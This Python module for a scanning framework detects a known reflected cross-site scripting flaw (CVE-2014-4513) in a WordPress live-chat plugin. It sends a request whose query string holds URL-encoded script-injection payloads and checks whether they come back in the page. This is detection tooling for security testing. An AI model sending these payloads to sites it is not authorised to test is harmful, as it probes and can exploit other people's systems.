#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple cross-site scripting vulnerabilities in server/offline."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ActiveHelper LiveHelp Server 3.1.0 - Cross-Site Scripting Detection',
        'description': 'Multiple cross-site scripting vulnerabilities in server/offline.php in the ActiveHelper LiveHelp Live Chat plugin 3.1.0 and earlier for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) MESSAGE, (2) EMAIL, or (3) NAME parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2014', 'cve', 'wordpress', 'xss', 'wp-plugin', 'activehelper', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-4513',
            'http://codevigilant.com/disclosure/wp-plugin-activehelper-livehelp-a3-cross-site-scripting-xss',
        ],
        'cve': 'CVE-2014-4513',
    }

    def run(self):
        path = '/wp-content/plugins/activehelper-livehelp/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('ActiveHelper LiveHelp Live Chat',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</textarea></script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='ActiveHelper LiveHelp Server 3.1.0 - Cross-Site Scripting detected', path=path)
            return True
        return False

